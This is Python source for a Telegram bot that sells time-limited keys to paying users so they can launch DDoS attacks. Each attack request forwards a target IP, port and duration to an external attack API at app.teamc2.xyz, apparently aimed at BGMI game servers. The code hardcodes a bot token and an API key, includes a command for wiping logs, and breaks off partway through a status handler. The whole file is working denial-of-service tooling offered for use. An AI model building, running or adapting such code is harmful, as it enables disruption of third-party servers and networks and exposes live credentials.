import telebot
import subprocess
import datetime
import os
import random
import string
import json
import requests
import time
import sys
import logging

# Setup logging to show in terminal
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)

# Insert your Telegram bot token here
bot = telebot.TeleBot('8827891490:AAHIDPQGdq9QoMei5jNcExqkFLndnQKqNrw')
# Admin user IDs (all as integers for proper comparison)
admin_id = {5835608849}

# API Configuration
API_URL = "http://app.teamc2.xyz/api/attack"
API_KEY = "P93CBG"

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"
CONFIG_FILE = "config.json"

# Default settings (can be changed via admin commands)
DEFAULT_CONFIG = {
    "max_attack_time": 240,  # Maximum attack duration in seconds
    "global_max_concurrent": 1,  # Maximum concurrent attacks globally
    "user_cooldown_time": 100,  # User cooldown in seconds
    "global_cooldown_time": 5,  # Global cooldown in seconds
    "consecutive_attacks_limit": 1,
    "consecutive_attacks_cooldown": 200
}

# Load config
def load_config():
    try:
        with open(CONFIG_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        save_config(DEFAULT_CONFIG)
        return DEFAULT_CONFIG

def save_config(config):
    with open(CONFIG_FILE, "w") as file:
        json.dump(config, file, indent=4)

# Initialize config
config = load_config()

# Global attack tracking
global_attack_active = 0  # Counter for active attacks
global_attack_lock = False
global_last_attack_time = 0
current_attack_info = []
attack_processes = {}  # Track active attacks with their details

# In-memory storage
users = {}
keys = {}
user_cooldown = {}
consecutive_attacks = {}

# Read users and keys from files initially
def load_data():
    global users, keys
    users = read_users()
    keys = read_keys()

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def log_command(user_id, target, port, time_duration):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID: {user_id}"

    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time_duration}\n\n")
    
    logger.info(f"ATTACK LOG - User: {username} | Target: {target} | Port: {port} | Duration: {time_duration}s")

def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                return "𝐋𝐨𝐠𝐬 𝐰𝐞𝐫𝐞 𝐀𝐥𝐫𝐞𝐚𝐝𝐲 𝐅𝐮𝐜𝐤𝐞𝐝"
            else:
                file.truncate(0)
                return "𝐅𝐮𝐜𝐤𝐞𝐝 𝐓𝐡𝐞 𝐋𝐨𝐠𝐬 𝐒𝐮𝐜𝐜𝐞𝐬𝐟𝐮𝐥𝐥𝐲✅"
    except FileNotFoundError:
        return "𝐋𝐨𝐠𝐬 𝐖𝐞𝐫𝐞 𝐀𝐥𝐫𝐞𝐚𝐝𝐲 𝐅𝐮𝐜𝐤𝐞𝐝."

def record_command_logs(user_id, command, target=None, port=None, time_duration=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time_duration:
        log_entry += f" | Time: {time_duration}"

    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

def generate_key(length=6):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')

def send_attack_via_api(target, port, time_duration, user_id):
    """Send attack request via the API"""
    attack_info = f"Target: {target}:{port} | Duration: {time_duration}s | User: {user_id}"
    current_attack_info.append(attack_info)
    attack_id = len(current_attack_info) - 1
    
    try:
        params = {
            'api_key': API_KEY,
            'target': target,
            'port': port,
            'time': time_duration,
            'concurrent': 1
        }
        
        logger.info(f"🚀 ATTACK STARTED - {attack_info}")
        
        response = requests.get(API_URL, params=params, timeout=10)
        
        logger.info(f"📡 API Response - Status: {response.status_code}")
        logger.info(f"📡 Response Body: {response.text[:500] if response.text else 'Empty'}")
        
        if response.status_code == 200:
            try:
                response_data = response.json()
                logger.info(f"✅ ATTACK SUCCESS - {attack_info}")
                return True, response_data, attack_id
            except:
                logger.info(f"✅ ATTACK SUCCESS - {attack_info}")
                return True, {"message": "Attack sent successfully"}, attack_id
        else:
            logger.error(f"❌ ATTACK FAILED - {attack_info} | HTTP {response.status_code}")
            return False, f"HTTP {response.status_code}", attack_id
            
    except requests.exceptions.Timeout:
        logger.error(f"⏰ ATTACK TIMEOUT - {attack_info}")
        return False, "Request timeout", attack_id
    except requests.exceptions.ConnectionError:
        logger.error(f"🔌 CONNECTION ERROR - {attack_info}")
        return False, "Connection failed", attack_id
    except Exception as e:
        logger.error(f"💥 ATTACK ERROR - {attack_info} | {str(e)}")
        return False, f"Error: {str(e)}", attack_id

def run_bot_forever():
    """Run bot with infinite retry on error"""
    while True:
        try:
            logger.info("🤖 Bot started successfully!")
            logger.info(f"🌐 Max Attack Time: {config['max_attack_time']}s")
            logger.info(f"🌐 Max Concurrent Attacks: {config['global_max_concurrent']}")
            logger.info(f"🌐 User Cooldown: {config['user_cooldown_time']}s | Global Cooldown: {config['global_cooldown_time']}s")
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            logger.error(f"❌ Bot crashed: {str(e)}")
            logger.info("🔄 Restarting bot in 5 seconds...")
            time.sleep(5)
            continue

@bot.message_handler(commands=['genkey'])
def generate_key_command(message):
    user_id = message.chat.id
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 3:
            try:
                time_amount = int(command[1])
                time_unit = command[2].lower()
                if time_unit == 'hours':
                    expiration_date = add_time_to_current_date(hours=time_amount)
                elif time_unit == 'days':
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Invalid time unit")
                key = generate_key()
                keys[key] = expiration_date
                save_keys()
                response = f"𝐊𝐞𝐲 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐢𝐨𝐧: {key}\n𝐄𝐬𝐩𝐢𝐫𝐞𝐬 𝐎𝐧: {expiration_date}"
                logger.info(f"Admin {user_id} generated key: {key}")
            except ValueError:
                response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐒𝐩𝐞𝐜𝐢𝐟𝐲 𝐀 𝐕𝐚𝐥𝐢𝐝 𝐍𝐮𝐦𝐛𝐞𝐫 𝐚𝐧𝐝 𝐮𝐧𝐢𝐭 𝐨𝐟 𝐓𝐢𝐦𝐞 (hours/days)."
        else:
            response = "𝐔𝐬𝐚𝐠𝐞: /genkey <amount> <hours/days>"
    else:
        response = "𝑶𝒏𝒍𝒚 𝑨𝒅𝒎𝒊𝒏 𝑪𝒂𝒏 𝑹𝒖𝒏 𝑻𝒉𝒊𝒔 𝑪𝒐𝒎𝒎𝒂𝒏𝒅."

    bot.reply_to(message, response)

@bot.message_handler(commands=['redeem'])
def redeem_key_command(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) == 2:
        key = command[1]
        if key in keys:
            expiration_date = keys[key]
            if user_id in users:
                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            else:
                users[user_id] = expiration_date
            save_users()
            del keys[key]
            save_keys()
            response = f"✅𝐊𝐞𝐲 𝐫𝐞𝐝𝐞𝐞𝐦𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐟𝐮𝐥𝐥𝐲! 𝐀𝐜𝐜𝐞𝐬𝐬 𝐆𝐫𝐚𝐧𝐭𝐞𝐝 𝐔𝐧𝐭𝐢𝐥𝐥: {users[user_id]}"
            logger.info(f"User {user_id} redeemed key: {key}")
        else:
            response = "𝐄𝐱𝐩𝐢𝐫𝐞 𝐊𝐞𝐘 𝐌𝐚𝐭 𝐃𝐚𝐚𝐋 𝐋𝐚𝐰𝐝𝐞 ."
    else:
        response = "𝐔𝐬𝐚𝐠𝐞: /redeem <key>"

    bot.reply_to(message, response)

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    global global_attack_active, global_attack_lock, global_last_attack_time
    
    user_id_int = message.chat.id
    user_id = str(user_id_int)
    current_time = time.time()
    
    max_concurrent = config['global_max_concurrent']
    max_time = config['max_attack_time']
    user_cooldown_time = config['user_cooldown_time']
    global_cooldown_time = config['global_cooldown_time']
    
    # Check if maximum concurrent attacks reached
    if global_attack_active >= max_concurrent:
        response = f"⚠️ 𝐌𝐚𝐱𝐢𝐦𝐮𝐦 {max_concurrent} 𝐚𝐭𝐭𝐚𝐜𝐤(𝐬) 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐢𝐧 𝐩𝐫𝐨𝐠𝐫𝐞𝐬𝐬! 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭. ⚠️"
        bot.reply_to(message, response)
        return
    
    # Check global cooldown (between attacks)
    time_since_last_global = current_time - global_last_attack_time
    if time_since_last_global < global_cooldown_time and global_last_attack_time > 0:
        remaining = int(global_cooldown_time - time_since_last_global)
        response = f"🌐 𝐆𝐥𝐨𝐛𝐚𝐥 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧 𝐚𝐜𝐭𝐢𝐯𝐞! 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 {remaining} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬. 🌐"
        bot.reply_to(message, response)
        return
    
    # Check if user has access
    if user_id in users:
        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        if datetime.datetime.now() > expiration_date:
            response = "❌ 𝐀𝐜𝐜𝐞𝐬𝐬 𝐆𝐨𝐓 𝐅𝐮𝐂𝐤𝐞𝐝 𝐆𝐞𝐍 𝐧𝐄𝐰 𝐊𝐞𝐘 𝐀𝐧𝐝 𝐫𝐞𝐝𝐞𝐞𝐌-> using /redeem <key> ❌"
            bot.reply_to(message, response)
            return
        
        # User cooldown check (admins bypass user cooldown but NOT global cooldown)
        if user_id_int not in admin_id:
            if user_id in user_cooldown:
                time_since_last_user = current_time - user_cooldown[user_id]
                if time_since_last_user < user_cooldown_time:
                    cooldown_remaining = int(user_cooldown_time - time_since_last_user)
                    response = f"⏰ 𝐔𝐬𝐞𝐫 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧! 𝐖𝐚𝐢𝐭 {cooldown_remaining} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬. ⏰"
                    bot.reply_to(message, response)
                    return
            
            # Consecutive attacks check
            if consecutive_attacks.get(user_id, 0) >= config['consecutive_attacks_limit']:
                if time_since_last_user < config['consecutive_attacks_cooldown']:
                    cooldown_remaining = config['consecutive_attacks_cooldown'] - int(time_since_last_user)
                    response = f"⚠️ 𝐂𝐨𝐧𝐬𝐞𝐜𝐮𝐭𝐢𝐯𝐞 𝐚𝐭𝐭𝐚𝐜𝐤 𝐥𝐢𝐦𝐢𝐭 𝐫𝐞𝐚𝐜𝐡𝐞𝐝! 𝐖𝐚𝐢𝐭 {cooldown_remaining} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬. ⚠️"
                    bot.reply_to(message, response)
                    return
                else:
                    consecutive_attacks[user_id] = 0

        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            try:
                port = int(command[2])
                time_duration = int(command[3])
                if time_duration > max_time:
                    response = f"⚠️ 𝐄𝐑𝐑𝐎𝐑: 𝐌𝐚𝐱 𝐚𝐭𝐭𝐚𝐜𝐤 𝐭𝐢𝐦𝐞 𝐢𝐬 {max_time} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬."
                    bot.reply_to(message, response)
                    return
                
                # Increment active attacks counter
                global_attack_active += 1
                
                # Update user cooldown and consecutive attacks
                user_cooldown[user_id] = current_time
                consecutive_attacks[user_id] = consecutive_attacks.get(user_id, 0) + 1
                
                # Send attack response to user
                attack_start_msg = f"✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 ✅\n\n🎮 𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🔌 𝐏𝐨𝐫𝐭: {port}\n⏱️ 𝐓𝐢𝐦𝐞: {time_duration} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n\n⚡ 𝐀𝐭𝐭𝐚𝐜𝐤 #{global_attack_active} 𝐢𝐧 𝐩𝐫𝐨𝐠𝐫𝐞𝐬𝐬..."
                bot.reply_to(message, attack_start_msg)
                
                # Log to terminal
                logger.info(f"📝 New attack request from User: {user_id} (Active attacks: {global_attack_active}/{max_concurrent})")
                
                # Execute attack
                success, api_response, attack_id = send_attack_via_api(target, port, time_duration, user_id)
                
                # Record logs
                record_command_logs(user_id, '/bgmi', target, port, time_duration)
                log_command(user_id_int, target, port, time_duration)
                
                # Track the attack process
                attack_processes[attack_id] = {
                    'user_id': user_id,
                    'target': target,
                    'port': port,
                    'time_duration': time_duration,
                    'start_time': current_time
                }
                
                # Wait for attack duration in a non-blocking way using threading
                import threading
                def wait_and_complete():
                    global global_attack_active, global_last_attack_time
                    time.sleep(time_duration)
                    global_attack_active -= 1
                    global_last_attack_time = time.time()
                    
                    # Clean up
                    if attack_id in attack_processes:
                        del attack_processes[attack_id]
                    if attack_info in current_attack_info:
                        current_attack_info.remove(attack_info)
                    
                    # Send completion message
                    completion_msg = f"✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄𝐃 ✅\n\n🎮 𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🔌 𝐏𝐨𝐫𝐭: {port}\n⏱️ 𝐓𝐢𝐦𝐞: {time_duration} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n\n💥 𝐀𝐭𝐭𝐚𝐜𝐤 𝐟𝐢𝐧𝐢𝐬𝐡𝐞𝐝 𝐬𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲!"
                    
                    if not success:
                        completion_msg += "\n\n⚠️ 𝐖𝐚𝐫𝐧𝐢𝐧𝐠: 𝐀𝐭𝐭𝐚𝐜𝐤 𝐦𝐚𝐲 𝐡𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐢𝐧𝐭𝐞𝐫𝐫𝐮𝐩𝐭𝐞𝐝"
                    
                    try:
                        bot.send_message(user_id_int, completion_msg)
                    except:
                        pass
                    
                    logger.info(f"✅ Attack completed. Active attacks: {global_attack_active}/{max_concurrent}")
                
                # Start the completion thread
                completion_thread = threading.Thread(target=wait_and_complete)
                completion_thread.daemon = True
                completion_thread.start()
                
            except ValueError:
                global_attack_active -= 1
                response = "𝐄𝐑𝐑𝐎𝐑» 𝐈𝐏 𝐏𝐎𝐑𝐓 𝐓𝐇𝐈𝐊 𝐒𝐄 𝐃𝐀𝐀𝐋 𝐂𝐇𝐔𝐓𝐘𝐄"
                bot.reply_to(message, response)
        else:
            response = f"𝐔𝐒𝐀𝐆𝐄: /𝐛𝐠𝐦𝐢 <𝐈𝐏> <𝐏𝐎𝐑𝐓> <𝐓𝐈𝐌𝐄>\n𝐌𝐀𝐗 𝐓𝐈𝐌𝐄: {max_time} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
            bot.reply_to(message, response)
    else:
        response = "💢 𝐎𝐧𝐥𝐲 𝐏𝐚𝐢𝐝 𝐌𝐞𝐦𝐛𝐞𝐫𝐬 𝐂𝐚𝐧 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 💢\n𝐂𝐨𝐧𝐭𝐚𝐜𝐭 @𝐀𝐝𝐦𝐢𝐧 𝐭𝐨 𝐠𝐞𝐭 𝐚𝐜𝐜𝐞𝐬𝐬"
        bot.reply_to(message, response)

@bot.message_handler(commands=['status'])
def show_status(message):
    """Show current attack status - Available for all users"""
    user_id = message.chat.id
    user_id_str = str(user_id)
    
    current_time = time.time()
    max_concurrent = config['global_max_concurrent']
    max_time = config['max_attack_time']
    user_cooldown_time = config['user_cooldown_time']
    global_cooldown_time = config['global_cooldown_time']
    
    # Common status info for all users
    status = "📊 **𝐒𝐘𝐒𝐓𝐄𝐌 𝐒𝐓𝐀𝐓𝐔𝐒**\n\n"
    status += "=" * 30 + "\n"
    
    # Attack status section
    if global_attack_active > 0:
        status += f"🔴 **{global_attack_active} 𝐀𝐓𝐓𝐀𝐂𝐊(𝐒) 𝐈𝐍 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒**\n"
        # Show detailed info to admins only
        if user_id in admin_id:
            for attack_info in current_attack_info:
                status += f"📡 {attack_info}\n"
            status += f"\n🔧 Active/Allowed: {global_attack_active}/{max_concurrent}\n"
        else:
            status += f"⏳ {global_attack_active} attack(s) running. Available: {max_concurrent - global_attack_active}\n"
    else:
        time_since_last = current_time - global_last_attack_time if global_last_attack_time > 0 else 999
        if time_since_last < global_cooldown_time:
            remaining = int(global_cooldown_time - time_since_last)
            status += f"🟡 **𝐆𝐋𝐎𝐁𝐀𝐋 𝐂𝐎𝐎𝐋𝐃𝐎𝐖𝐍 𝐀𝐂𝐓𝐈𝐕𝐄**\n"
            status += f"⏱️ {remaining}s remaining until next attack\n"
        else:
            status += "🟢 **𝐒𝐘𝐒𝐓𝐄𝐌 𝐑𝐄𝐀𝐃𝐘**\n"
            status += f"✅ {max_concurrent} attack(s) available\n"
    
    # User-specific info
    status += "\n" + "=" * 30 + "\n"
    status += "👤 **𝐘𝐎𝐔𝐑 𝐒𝐓𝐀𝐓𝐔𝐒**\n"
    
    # Check if user has access
    if user_id_str in users:
        expiration_date = datetime.datetime.strptime(users[user_id_str], '%Y-%m-%d %H:%M:%S')
        if datetime.datetime.now() > expiration_date:
            status += "❌ Your access has EXPIRED\n"
            status += f"📅 Expired on: {users[user_id_str]}\n"
            status += "💡 Contact admin to renew\n"
        else:
            time_remaining = expiration_date - datetime.datetime.now()
            days = time_remaining.days
            hours = time_remaining.seconds // 3600
            minutes = (time_remaining.seconds % 3600) // 60
            status += "✅ Your access: ACTIVE\n"
            status += f"📅 Expires in: {days}d {hours}h {minutes}m\n"
            
            # Show user cooldown info
            if user_id_str in user_cooldown:
                time_since_last_user = current_time - user_cooldown[user_id_str]
                if time_since_last_user < user_cooldown_time:
                    remaining = int(user_cooldown_time - time_since_last_user)
                    status += f"⏰ Your cooldown: {remaining}s remaining\n"
                else:
                    status += "⏰ Your cooldown: Ready ✅\n"
            else:
                status += "⏰ Your cooldown: Ready ✅\n"
                
            # Show consecutive attacks info
            user_attacks = consecutive_attacks.get(user_id_str, 0)
            status += f"🔄 Attacks used: {user_attacks}/{config['consecutive_attacks_limit']}\n"
            
            # Count user's active attacks
            user_active = sum(1 for p in attack_processes.values() if p['user_id'] == user_id_str)
            if user_active > 0:
                status += f"⚡ Your active attacks: {user_active}\n"
    else:
        if user_id in admin_id:
            status += "👑 Admin Access\n"
        else:
            status += "❌ No access\n"
            status += "💡 Use /redeem <key> to get access\n"
    
    # Admin section (only visible to admins)
    if user_id in admin_id:
        status += "\n" + "=" * 30 + "\n"
        status += "👑 **"
